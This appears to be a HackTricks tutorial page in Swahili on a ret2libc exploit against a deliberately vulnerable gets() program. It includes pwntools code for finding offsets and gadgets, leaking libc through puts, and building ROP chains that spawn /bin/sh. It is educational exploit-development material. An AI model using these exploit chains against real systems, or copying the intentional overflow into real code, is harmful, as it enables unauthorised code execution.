<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inayotangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>


# Muhtasari wa Haraka

1. **Pata** kosa la **kujaa**
2. **Pata** vifaa vya `POP_RDI`, `PUTS_PLT` na `MAIN_PLT`
3. Tumia vifaa vilivyopita ku **vuja anwani ya kumbukumbu** ya puts au kazi nyingine ya libc na **pata toleo la libc** ([pakua hapa](https://libc.blukat.me))
4. Kwa kutumia maktaba, **hesabu ROP na itumie kudukua**

# Mafunzo mengine na faili za mazoezi

Mafunzo haya yatakuwa yakidukua nambari/faili iliyopendekezwa katika mafunzo haya: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
Mafunzo mengine muhimu: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

# Nambari

Jina la faili: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```
# ROP - Kuvuja kwa LIBC kigezo

Nitatumia kificho kilichopo hapa kuunda shambulizi.\
Pakua shambulizi na weka katika saraka ile ile na faili dhaifu na toa data inayohitajika kwa skripti:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 1- Kupata kigezo

Kigezo kinahitajika kabla ya kuendelea na shambulizi. Ikiwa hakuna kinachotolewa, itatekeleza kificho muhimu kupata kigezo (kwa chaguo-msingi `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**Tekeleza** `python template.py` konsoli ya GDB itafunguliwa na programu itakuwa imeharibika. Ndani ya **konsoli ya GDB** tekeleza `x/wx $rsp` ili kupata **baiti** ambazo zingeharibu RIP. Hatimaye, pata **kielelezo** kwa kutumia konsoli ya **python**:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../.gitbook/assets/image (140).png>)

Baada ya kupata offset (katika kesi hii 40), badilisha kipengele cha OFFSET ndani ya kigezo kwa kutumia thamani hiyo.\
`OFFSET = "A" * 40`

Njia nyingine ni kutumia: `pattern create 1000` -- _execute until ret_ -- `pattern search $rsp` kutoka GEF.

# 2- Kupata Gadgets

Sasa tunahitaji kupata gadgets za ROP ndani ya faili ya binary. Gadgets hizi za ROP zitakuwa na manufaa kwa kuita `puts` ili kupata **libc** inayotumiwa, na baadaye kwa **kuendesha shambulio la mwisho**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT` inahitajika ili kuita **kazi ya puts**.\
`MAIN_PLT` inahitajika ili kuita **kazi kuu** tena baada ya mwingiliano mmoja ili **kutumia** ujazo **tena** (mizunguko isiyokuwa na mwisho ya kutumia). **Inatumika mwishoni mwa kila ROP ili kuita programu tena**.\
**POP\_RDI** inahitajika ili **kupeleka** **parameter** kwa kazi iliyoitwa.

Katika hatua hii, hauhitaji kutekeleza chochote kwani pwntools itapata kila kitu wakati wa utekelezaji.

# 3- Kupata maktaba ya LIBC

Sasa ni wakati wa kupata toleo gani la maktaba ya **libc** inatumika. Ili kufanya hivyo, tutafanya **uvujaji** wa **anwani** kwenye kumbukumbu ya **kazi** ya `puts` na kisha tutatafuta katika toleo gani la maktaba kuna toleo la puts katika anwani hiyo.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
Kufanya hivyo, mstari muhimu zaidi wa nambari iliyotekelezwa ni:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Hii itatuma baadhi ya herufi mpaka **kubadilisha** **RIP** iwezekane: `OFFSET`.\
Kisha, itaweka **anwani** ya kifaa cha `POP_RDI` ili anwani inayofuata (`FUNC_GOT`) iokolewe katika usajili wa **RDI**. Hii ni kwa sababu tunataka **kuita puts** **ikiipitisha** anwani ya `PUTS_GOT` kama anwani kwenye kumbukumbu ya kazi ya puts imehifadhiwa katika anwani inayoashiria na `PUTS_GOT`.\
Baada ya hapo, `PUTS_PLT` itaitwa (na `PUTS_GOT` ndani ya **RDI**) hivyo puts itasoma **maudhui** ndani ya `PUTS_GOT` (**anwani ya kazi ya puts kwenye kumbukumbu**) na kui **chapisha**.\
Hatimaye, **kazi kuu inaitwa tena** ili tuweze kutumia kuzidiwa tena.

Kwa njia hii tumefanya **udanganyifu wa kazi ya puts** ili **ichapishe** anwani katika **kumbukumbu** ya kazi ya **puts** (ambayo iko ndani ya maktaba ya **libc**). Sasa tukiwa na anwani hiyo tunaweza **kutafuta toleo la libc linalotumiwa**.

![](<../../../.gitbook/assets/image (141).png>)

Kwa kuwa tunafanya **udanganyifu** kwenye **binary** ya ndani, **haifai** kugundua toleo gani la **libc** linatumika (tuone maktaba katika `/lib/x86_64-linux-gnu/libc.so.6`).\
Lakini, katika kesi ya udanganyifu wa mbali, nitaelezea hapa jinsi unavyoweza kugundua:

## 3.1- Kutafuta toleo la libc (1)

Unaweza kutafuta maktaba inayotumiwa kwenye ukurasa wa wavuti: [https://libc.blukat.me/](https://libc.blukat.me)\
Pia itakuruhusu kupakua toleo lililopatikana la **libc**

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- Kutafuta toleo la libc (2)

Unaweza pia kufanya:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

Hii itachukua muda fulani, kuwa na subira.\
Ili hii ifanye kazi, tunahitaji:

* Jina la ishara ya libc: `puts`
* Anwani iliyovuja ya libc: `0x7ff629878690`

Tunaweza kugundua **libc** ipi inayotumiwa zaidi.
```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Tunapata mechi 2 (unapaswa kujaribu ya pili ikiwa ya kwanza haifanyi kazi). Pakua ya kwanza:
```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
Nakili libc kutoka `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` hadi kwenye saraka yetu ya kazi.

## 3.3- Kazi nyingine za kuvuja
```python
puts
printf
__libc_start_main
read
gets
```
# 4- Kupata anwani ya msingi ya libc na kuitumia kwa kudukua

Kufikia hatua hii tunapaswa kujua maktaba ya libc iliyotumiwa. Kwa kuwa tunadukua faili ya ndani, nitatumia tu: `/lib/x86_64-linux-gnu/libc.so.6`

Kwa hivyo, mwanzoni mwa `template.py` badilisha **libc** kwa: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it`

Kwa kutoa **njia** ya **maktaba ya libc**, sehemu nyingine ya **kudukua itahesabiwa kiotomatiki**.

Ndani ya kazi ya `get_addr`, **anwani ya msingi ya libc** itahesabiwa:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
Tafadhali kumbuka kuwa **anwani ya msingi ya libc lazima iishie na 00**. Ikiwa sivyo, huenda umevuja maktaba isiyo sahihi.
{% endhint %}

Kisha, anwani ya kazi ya `system` na **anwani** ya herufi _"/bin/sh"_ zitahesabiwa kutoka kwa **anwani ya msingi** ya **libc** na kutoa **maktaba ya libc.**
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Hatimaye, shambulio la utekelezaji wa /bin/sh litakuwa tayari kutumwa:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Hebu tueleze ROP hii ya mwisho. 
ROP ya mwisho (`rop1`) ilimalizika kwa kuita tena kazi ya msingi, kwa hivyo tunaweza **kutumia tena** **kuzidi** (ndiyo sababu `OFFSET` iko hapa tena). Kisha, tunataka kuita `POP_RDI` ikielekeza kwenye **anwani** ya _"/bin/sh"_ (`BINSH`) na kuita kazi ya **system** (`SYSTEM`) kwa sababu anwani ya _"/bin/sh"_ itapitishwa kama parameter. 
Hatimaye, **anwani ya kazi ya exit** inaitwa ili mchakato uishe vizuri na tahadhari yoyote haijatolewa.

**Kwa njia hii, shambulio litatekeleza kikao cha **_**/bin/sh**_**.**

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- Kutumia ONE\_GADGET

Unaweza pia kutumia [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) ili kupata kikao badala ya kutumia **system** na **"/bin/sh". ONE\_GADGET** itapata ndani ya maktaba ya libc njia ya kupata kikao kwa kutumia anwani moja tu ya **ROP**. 
Hata hivyo, kawaida kuna vikwazo fulani, vikwazo vya kawaida na rahisi kuepuka ni kama `[rsp+0x30] == NULL` Kwa kuwa unadhibiti thamani ndani ya **RSP** unahitaji tu kutuma thamani zingine za NULL ili kuepuka kikwazo.

![](<../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
# FAILI LA KUINGIZA

Unaweza kupata kigezo cha kutumia udhaifu huu hapa:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# Matatizo ya Kawaida

## MAIN\_PLT = elf.symbols\['main'] haipatikani

Ikiwa ishara ya "main" haipo. Basi unaweza tu kuangalia wapi kuna kificho cha main:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
na weka anwani kwa mkono:
```python
MAIN_PLT = 0x401080
```
## Puts haipatikani

Ikiwa faili ya binary haiitumii Puts, unapaswa kuangalia ikiwa inatumia

## `sh: 1: %s%s%s%s%s%s%s%s: haipatikani`

Ikiwa unakutana na **kosa** hili baada ya kuunda **exploit zote**: `sh: 1: %s%s%s%s%s%s%s%s: haipatikani`

Jaribu **kupunguza 64 bytes kwenye anwani ya "/bin/sh"**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
